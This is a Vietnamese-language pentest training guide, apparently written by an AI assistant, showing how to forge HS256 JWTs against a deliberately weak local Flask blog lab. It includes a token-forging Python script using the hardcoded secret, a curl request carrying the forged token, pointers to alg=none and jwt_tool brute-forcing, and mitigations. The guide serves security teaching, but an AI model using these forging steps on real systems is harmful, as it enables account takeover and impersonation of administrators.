# Hướng Dẫn Tấn Công JWT Forging Trên Ứng Dụng Web Local

## Giới thiệu
Ứng dụng này là một blog đơn giản với React frontend và Flask backend sử dụng JWT cho authentication. 
**Lỗ hổng chính**: Secret key fallback mặc định `tccvip_prod` (không mạnh, dễ đoán). Hacker có thể forge JWT token để impersonate user (ví dụ admin hoặc bất kỳ user nào).

Hướng dẫn này mô phỏng góc nhìn của một **black-hat hacker** thực hiện reconnaissance, exploitation từ đầu đến cuối trên môi trường local.

---

## 1. Chuẩn bị Môi Trường Local (Setup Lab)

### Bước 1.1: Cài đặt Prerequisites
- **Node.js** (v16+): [Tải tại nodejs.org](https://nodejs.org)
- **Python 3.8+** và `pip`
- **MySQL** (hoặc MariaDB): Cài đặt và chạy server (port 3306)
- Git (tùy chọn)

### Bước 1.2: Tạo Project Directory
```bash
mkdir jwt-vuln-lab
cd jwt-vuln-lab
```

### Bước 1.3: Tạo các file từ code attachments
Tạo các thư mục và file sau (copy nội dung từ attachments):

- `backend/app.py` (Flask backend)
- `frontend/src/App.js`, `frontend/src/App.css`, `frontend/src/index.js`
- Tạo thư mục `frontend/src/components/` và thêm Login, Register, Blog, Profile components (bạn cần implement hoặc extract từ logic).

**Lưu ý**: Để đơn giản, giả sử bạn có đầy đủ source. Nếu không, tôi có thể cung cấp thêm.

### Bước 1.4: Setup Database
```sql
CREATE DATABASE blog_db;
USE blog_db;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(150) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    bio TEXT,
    created_at DATETIME
);

CREATE TABLE posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255),
    content TEXT,
    user_id INT,
    created_at DATETIME,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    content TEXT,
    post_id INT,
    user_id INT,
    created_at DATETIME,
    FOREIGN KEY (post_id) REFERENCES posts(id),
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Tạo user test (password: 123456)
INSERT INTO users (username, email, password, created_at) VALUES 
('admin', 'admin@example.com', '$2b$12$examplehash...', NOW()),
('testuser', 'test@example.com', '$2b$12$...', NOW());
```

### Bước 1.5: Cấu hình Environment
Tạo file `.env` trong thư mục backend:

```env
SECRET_KEY=tccvip_prod  # Fallback key - LỖ HỔNG!
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=yourpassword
DB_NAME=blog_db
FRONTEND_ORIGINS=http://localhost:3000
USE_HTTPS=False
BACKEND_PORT=5000
```

### Bước 1.6: Chạy Backend
```bash
cd backend
pip install flask flask-cors mysql-connector-python python-dotenv bcrypt pyjwt bleach flask-limiter email-validator flask-wtf werkzeug
python app.py
```

Backend chạy tại `http://localhost:5000`

### Bước 1.7: Chạy Frontend
```bash
cd frontend
npm install axios
npm start
```

Frontend chạy tại `http://localhost:3000`

---

## 2. Reconnaissance (Thu Thập Thông Tin)

### Bước 2.1: Khám phá API Endpoints
Sử dụng Burp Suite hoặc browser DevTools:

- Đăng ký user mới: `POST /api/register`
- Login: `POST /api/login`
- Get posts: `GET /api/posts`
- Profile: `GET /api/users/{id}`

### Bước 2.2: Phân tích JWT Token
Sau khi login thành công, token được trả về trong response và cookie `auth_token`.

Decode token tại [jwt.io](https://jwt.io):

```json
{
  "user_id": 1,
  "username": "admin",
  "exp": 1234567890
}
```

**Header**: `{"alg": "HS256", "typ": "JWT"}`

**Signature**: Dùng secret key để verify.

---

## 3. Exploitation - JWT Forging (Tấn Công Chính)

### Bước 3.1: Khai thác Fallback Key
- Secret key mặc định là **"tccvip_prod"** (hardcoded fallback trong `app.py`).

Hacker có thể:
1. Brute-force (dễ vì weak key)
2. Hoặc trực tiếp dùng key này (nếu leak qua source code, env, hoặc error).

### Bước 3.2: Forge Token Bằng Tool

**Cách 1: Sử dụng jwt.io (Manual)**
1. Vào https://jwt.io
2. Paste payload mẫu:
   ```json
   {
     "user_id": 1,
     "username": "admin",
     "exp": 9999999999
   }
   ```
3. Algorithm: **HS256**
4. Secret: `tccvip_prod`
5. Copy token đã sign.

**Cách 2: Sử dụng Python Script (Tự động)**
Tạo file `forge_jwt.py`:

```python
import jwt
import datetime

secret = "tccvip_prod"
payload = {
    'user_id': 1,  # ID của admin hoặc target user
    'username': 'admin',
    'exp': datetime.datetime.utcnow() + datetime.timedelta(days=30)
}

token = jwt.encode(payload, secret, algorithm='HS256')
print("Forged Token:", token)
```

Chạy: `python forge_jwt.py`

### Bước 3.3: Sử Dụng Forged Token
- Thêm header: `Authorization: Bearer <forged_token>`
- Hoặc set cookie `auth_token=<forged_token>`
- Truy cập protected routes: create post, change password, view profile với quyền admin.

Ví dụ curl:
```bash
curl -X GET http://localhost:5000/api/posts \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Bước 3.4: Privilege Escalation
- Forge token cho user_id cao nhất (admin).
- Thay đổi password của victim.
- Post comment/toàn quyền blog dưới tên admin.

---

## 4. Advanced Attacks

### 4.1: None Algorithm Attack (nếu hỗ trợ)
Thử đổi alg thành "none" và xóa signature.

### 4.2: Key Confusion (nếu có public key)
Không áp dụng ở đây vì HS256 symmetric.

### 4.3: Brute-force Secret (nếu không biết fallback)
Sử dụng tool như `jwt_tool`:
```bash
python jwt_tool.py <token> -k wordlist.txt
```

---

## 5. Mitigation (Để Fix Lab)
- Sử dụng secret mạnh, random (ít nhất 32 chars), từ env chỉ.
- Không hardcode fallback.
- Sử dụng RS256 (asymmetric) với private key.
- Validate `alg` nghiêm ngặt.
- Short expiration + refresh token.
- Rate limiting mạnh hơn.

---

## 6. Tools Khuyến nghị
- **Burp Suite** / **ZAP** cho intercept
- **jwt.io**
- **Postman**
- **sqlmap** (cho các vuln khác)
- **ffuf** cho directory brute

**Cảnh báo**: Chỉ thực hiện trên môi trường lab local của bạn. Không dùng trên production!

---

**Tác giả**: Hướng dẫn cho mục đích học tập và pentest training.
```

**File đã được tạo: `jwt_forging_attack_guide.md`**

Bạn có thể mở file này để xem hoặc chỉnh sửa thêm. Nếu cần thêm components frontend đầy đủ hoặc script setup tự động, hãy cho tôi biết!